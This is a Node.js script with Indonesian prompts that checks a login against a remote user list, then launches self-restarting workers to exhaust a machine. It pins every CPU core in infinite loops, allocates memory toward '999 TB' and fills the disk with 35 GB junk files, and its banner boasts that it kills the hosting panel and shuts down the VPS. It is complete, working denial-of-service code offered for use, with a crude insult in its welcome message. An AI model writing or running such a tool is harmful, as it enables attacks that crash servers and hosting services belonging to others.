const { Worker, isMainThread } = require('worker_threads');
const { spawn } = require('child_process');
const os = require('os');
const fs = require('fs');
const path = require('path');
const readline = require('readline');
const https = require('https');
const crypto = require('crypto');
const readlineSync = require('readline-sync');

function createHash(data) {
    return crypto.createHash('sha256').update(data).digest('hex');
}

function fetchData(url) {
    return new Promise((resolve, reject) => {
        https.get(url, (res) => {
            let data = '';
            res.on('data', (chunk) => data += chunk);
            res.on('end', () => {
                try {
                    resolve(JSON.parse(data));
                } catch (e) {
                    reject(new Error('Eror: File nya gak bisa!'));
                }
            });
        }).on('error', (err) => {
            reject(new Error(`Eror: ${err.message}`));
        });
    });
}

async function validasiInteraktif() {
    console.log('Memulai menjalankan...');
    const xayzTechVX = 'https://xayzsecure.vercel.app/Xayzprotech.json';
    let authorizedUsers;
    try {
        console.log('Mengambil data...');
        authorizedUsers = await fetchData(xayzTechVX);
        if (!Array.isArray(authorizedUsers)) {
            throw new Error('Format tidak valid dan tidak sesuai.');
        }
    } catch (error) {
        throw new Error(`Gagal mengambil data: ${error.message}`);
    }
    console.log('Masukkan Username nya');
    const username = readlineSync.question('Username: ');
    const pengguna = authorizedUsers.find(u => u.username === username);
    if (!pengguna) {
        throw new Error('Username tidak ditemukan.');
    }
    console.log('Masukkan Password nya');
    const password = readlineSync.question('Masukkan Password: ', {
        hideEchoBack: true
    });
    const localPassHash = createHash(password);
    if (pengguna.password_hash !== localPassHash) {
        throw new Error('Password salah.');
    }
    if (pengguna.active !== true) {
        throw new Error('Akun ini tidak aktif. Silakan hubungi admin @XYCoolcraft (TELEGRAM).');
    }
    console.log(`\nBerhasil: Selamat datang, ${pengguna.username} yang suka ngewe!`);
    return true;
}

const TARGET_TB_BYTES = 999 * 1024 * 1024 * 1024 * 1024;
const DISK_FILE_BYTES_25GB = 35 * 1024 * 1024 * 1024;
const BLOCK_SIZE_1MB = 1 * 1024 * 1024;

function runCpuStress() {
    while (true) {}
}

function runRamStress() {
    while (true) { 
        console.log('📈 [RAM-SYSTEM] Dimulai... Dashboard RAM akan FREEZE.');
        const memoryStorage = [];
        const TARGET_RAM_BYTES = TARGET_TB_BYTES;
        let totalAllocated = 0;
        try {
            while (totalAllocated < TARGET_RAM_BYTES) {
                memoryStorage.push(Buffer.alloc(BLOCK_SIZE_1MB, 'a'));
                totalAllocated += BLOCK_SIZE_1MB;
            }
        } catch (e) {
            if (process.send) {
                process.send({ type: 'error-ram', message: e.message, progress: totalAllocated });
            }
        }
    }
}

async function createDiskFile(filePath, size, onProgressCallback) {
  return new Promise((resolve, reject) => {
    const stream = fs.createWriteStream(filePath, { highWaterMark: BLOCK_SIZE_1MB });
    const buf = Buffer.alloc(BLOCK_SIZE_1MB, 0);
    let written = 0;

    function writeMore() {
      let ok = true;
      while (ok && written < size) {
        const remaining = size - written;
        const chunk = remaining >= BLOCK_SIZE_1MB ? buf : buf.subarray(0, remaining);
        ok = stream.write(chunk);
        written += chunk.length;

        onProgressCallback(written);
      }
      if (written >= size) {
        stream.end();
      }
    }

    stream.on("drain", writeMore);
    stream.on("error", reject);
    stream.on("finish", () => {
      onProgressCallback(written);
      resolve();
    });

    writeMore();
  });
}

async function runDiskStress_GODMODE() {
    while (true) {
        const FILE_SIZE = DISK_FILE_BYTES_25GB;
        const TARGET_SIZE = TARGET_TB_BYTES;
        
        let totalWritten = 0;
        let fileIndex = 1;

        while (totalWritten < TARGET_SIZE) {
            const filePath = path.join(__dirname, `file_${fileIndex}_GODMODE.bin`);
            let currentFileProgress = 0;
            
            try {
                await createDiskFile(filePath, FILE_SIZE, (progress) => {
                    currentFileProgress = progress;
                    if (process.send) {
                        process.send({
                            type: 'progress-disk',
                            totalProgress: totalWritten + currentFileProgress,
                            fileProgress: currentFileProgress,
                            fileName: path.basename(filePath),
                            fileSize: FILE_SIZE
                        });
                    }
                });
                
                totalWritten += FILE_SIZE;
                fileIndex++;
            } catch (error) {
                if (process.send) {
                    process.send({ type: 'error-disk', message: error.message, progress: totalWritten });
                }
                break;
            }
        }
    }
}

async function RunTestDisk() {
    while (true) {
        const FILE_SIZE = DISK_FILE_BYTES_25GB;
        const TARGET_SIZE = TARGET_TB_BYTES;
        
        let totalWritten = 0;
        let fileIndex = 1;
        while (totalWritten < TARGET_SIZE) {
            const filePath = path.join(__dirname, `file_${fileIndex}_TEST.bin`);
            let currentFileProgress = 0;
            
            try {
                await createDiskFile(filePath, FILE_SIZE, (progress) => {
                    currentFileProgress = progress;
                    if (process.send) {
                        process.send({
                            type: 'progress-disk',
                            totalProgress: totalWritten + currentFileProgress,
                            fileProgress: currentFileProgress,
                            fileName: path.basename(filePath),
                            fileSize: FILE_SIZE
                        });
                    }
                });
                
                totalWritten += FILE_SIZE;
                fileIndex++;
            } catch (error) {
                if (process.send) {
                    process.send({ type: 'error-disk', message: error.message, progress: totalWritten });
                }
                break;
            }
        }
    }
}

function runDiskStress_OMEGA() {
    while (true) { 
        console.log('💾 [DISK-SYSTEM] Dimulai/Restart Paksa (Mode OMEGA - ANTI CREATE FILE).');
        const diskStorage = [];
        const TARGET_DISK_BYTES = TARGET_TB_BYTES;
        let totalAllocated = 0;
        
        try {
            while (totalAllocated < TARGET_DISK_BYTES) {
                diskStorage.push(Buffer.alloc(BLOCK_SIZE_1MB, 'b'));
                totalAllocated += BLOCK_SIZE_1MB;
            }
        } catch (e) {
            if (process.send) {
                process.send({ type: 'error-disk', message: e.message, progress: totalAllocated });
            }
        }
    }
}


let dashboardStatus = {
    cpu: { status: 'Waiting...', cores: 0 },
    ram: { progress: 0, status: 'Waiting...' },
    disk: { totalProgress: 0, fileProgress: 0, fileName: 'N/A', fileSize: 0, status: 'Waiting...' }
};

let errorLogs = [];
function logError(prefix, message) {
    const logMsg = `[${new Date().toLocaleTimeString()}] ${prefix} ${message}`;
    errorLogs.push(logMsg);
    if (errorLogs.length > 5) errorLogs.shift();
}

function formatSize(bytes) {
    const gb = (bytes / 1024 ** 3).toFixed(2);
    return `${gb} GB`;
}

function drawDashboard() {
    console.clear();
    console.log('============================================');
    console.log('🔥🔪⚙️ MONITORING & SYSTEM PROGRESS 🔥🔪⚙️');
    console.log('If you see that the disk and RAM are slowing down, its not because the creation size is in GB (Giga Bytes), so thats normal.');
    console.log('WARNING: This version is brutal and its very instant to kill the panel and make the VPS also turn off.');
    console.log('Created And Developer By: @XYCoolcraft\n Note: Dont blame the creator, but blame it on careless misuse and dont play slander!.');
    console.log('============================================\n');

    const { cpu, ram, disk } = dashboardStatus;
    console.log(`💻 CPU: ${cpu.cores} Cores [${cpu.status}]`);
    let ramStatus = ram.status === 'Running' ?
        `${formatSize(ram.progress)} / 999 TB` : `[${ram.status}]`;
    console.log(`📈 RAM: ${ramStatus}`);
    let diskStatus = disk.status === 'Running' ?
        `${formatSize(disk.totalProgress)} / 999 TB  (File: ${disk.fileName} [${formatSize(disk.fileProgress)} / ${formatSize(DISK_FILE_BYTES_25GB)}])` : `[${disk.status}]`;
    console.log(`💾 DISK: ${diskStatus}`);
    console.log('\n--- System Logs ---');
    console.log(errorLogs.join('\n'));
}

function launchWorker(workerArg, logPrefix) {
    const worker = spawn('node', [__filename, workerArg], {
        stdio: ['ignore', 'ignore', 'ignore', 'ipc']
    });

    worker.on('message', (msg) => {
        if (msg.type === 'progress-ram') {
            dashboardStatus.ram = { progress: msg.progress, status: 'Running' };
        }
        else if (msg.type === 'progress-disk') {
            dashboardStatus.disk = { ...msg, status: 'Running' };
        }
        else if (msg.type === 'error-ram') {
            logError(logPrefix, `GAGAL ALOKASI PADA ${formatSize(msg.progress)}: ${msg.message}`);
        }
        else if (msg.type === 'error-disk') {
            logError(logError, `GAGAL TULIS PADA ${formatSize(msg.progress)}: ${msg.message}`);
        }
    });

    worker.on('close', (code) => {
        logError(logPrefix, `SYSTEM BERHENTI! (Kode: ${code}). Me-restart...`);
        if (workerArg === '--run-ram') dashboardStatus.ram.status = 'Restarting...';
        if (workerArg.startsWith('--run-disk-')) dashboardStatus.disk.status = 'Restarting...';
        setImmediate(() => {
            launchWorker(workerArg, logPrefix);
        });
    });

    worker.on('error', (err) => {
        logError(logPrefix, `GAGAL MELUNCURKAN: ${err.message}. Mencoba lagi...`);
        setImmediate(() => {
            launchWorker(workerArg, logPrefix);
        });
    });
}

function startManajer() {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    console.clear();
    console.log('============================================');
    console.log('🔥🔪⚙️ PILIH MODE NYA BANG! (13 PILIHAN) 🔥🔪⚙️');
    console.log('============================================');
    console.log('Mode Individual:');
    console.log(' 1. Disk Saja');
    console.log(' 2. RAM Saja');
    console.log(' 3. CPU Saja');
    console.log('\nMode Ganda:');
    console.log(' 4. Disk + RAM');
    console.log(' 5. RAM + CPU');
    console.log(' 6. Disk + CPU');
    console.log('\nMode Ganda (GODMODE):');
    console.log(' 7. RAM + CPU (GODMODE)');
    console.log(' 8. Disk + CPU (GODMODE)');
    console.log(' 9. Disk + RAM (GODMODE)');
    console.log('\nMode Ganda (OMEGA):');
    console.log(' 11. RAM + CPU (OMEGA)');
    console.log(' 12. Disk + CPU (OMEGA)');
    console.log(' 13. Disk + RAM (OMEGA)');
    console.log('\nMode BRUTAL:');
    console.log(' 10. GODMODE (Disk + RAM + CPU)');
    console.log(' 14. OMEGA (Disk + RAM + CPU)'); 
    console.log('============================================');
    console.log('Kemungkinan karena ini sangat brutal anda akan melihat Proses Ram yang ada di tampilan Console akan terlihat Freeze Karena ini Mode Cepat');
    console.log('============================================');
    
    
    
    
    console.log('Silahkan Pilih ( 1-14 ):');

    rl.question('Masukkan pilihan (1-14): ', (choice) => {
        
        let launchCPU = false;
        let launchRAM = false;
        let diskWorkerArg = null;
        let diskLogPrefix = '';

        switch (choice) {
            case '1': 
                diskWorkerArg = '--run-disk-test';
                diskLogPrefix = '💾 [DISK]';
                break;
            case '2': 
                launchRAM = true;
                break;
            case '3': 
                launchCPU = true;
                break;
            case '4': 
                diskWorkerArg = '--run-disk-test';
                diskLogPrefix = '💾 [DISK]';
                launchRAM = true;
                break;
            case '5': 
            case '7': 
            case '11': 
                launchRAM = true;
                launchCPU = true;
                break;
            case '6': 
                diskWorkerArg = '--run-disk-test';
                diskLogPrefix = '💾 [DISK]';
                launchCPU = true;
                break;
            case '8': 
                diskWorkerArg = '--run-disk-godmode';
                diskLogPrefix = '💾 [DISK-GODMODE]';
                launchCPU = true;
                break;
            case '9': 
                diskWorkerArg = '--run-disk-godmode';
                diskLogPrefix = '💾 [DISK-GODMODE]';
                launchRAM = true;
                break;
            case '10': 
                diskWorkerArg = '--run-disk-godmode';
                diskLogPrefix = '💾 [DISK-GODMODE]';
                launchRAM = true;
                launchCPU = true;
                break;
            case '12': 
                diskWorkerArg = '--run-disk-omega';
                diskLogPrefix = '💾 [DISK-OMEGA]';
                launchCPU = true;
                break;
            case '13': 
                diskWorkerArg = '--run-disk-omega';
                diskLogPrefix = '💾 [DISK-OMEGA]';
                launchRAM = true;
                break;
            case '14': 
                diskWorkerArg = '--run-disk-omega';
                diskLogPrefix = '💾 [DISK-OMEGA]';
                launchRAM = true;
                launchCPU = true;
                break;
            default:
                console.log('Pilihan salah. Keluar.');
                rl.close();
                process.exit();
                return;
        }
        
        rl.close();
        console.log('Pilihan diterima. Memulai sistem...');

        setInterval(drawDashboard, 500);

        if (launchCPU) {
            const numCPUs = os.cpus().length;
            dashboardStatus.cpu = { status: 'RUNNING', cores: numCPUs };
            for (let i = 0; i < numCPUs; i++) {
                launchWorker('--run-cpu', `💻 [CPU-${i + 1}]`);
            }
        }
        
        if (launchRAM) {
            launchWorker('--run-ram', '📈 [RAM]');
        }
        
        if (diskWorkerArg) {
            launchWorker(diskWorkerArg, diskLogPrefix);
        }
    });
}

async function jalankanAplikasi() {
    try {
        await validasiInteraktif();
        console.log('Berhasil Verifikasi. Menjalankan...');
        startManajer(); 
    } catch (error) {
        console.error('===================================');
        console.error(`EROR: ${error.message}`);
        console.error('===================================');
        process.exit(1); 
    }
}

if (process.argv.includes('--run-cpu')) {
    runCpuStress();
} 
else if (process.argv.includes('--run-ram')) {
    runRamStress();
} 
else if (process.argv.includes('--run-disk-godmode')) {
    runDiskStress_GODMODE();
}
else if (process.argv.includes('--run-disk-omega')) {
    runDiskStress_OMEGA();
}
else if (process.argv.includes('--run-disk-test')) {
    RunTestDisk();
}
else {
    jalankanAplikasi();
}
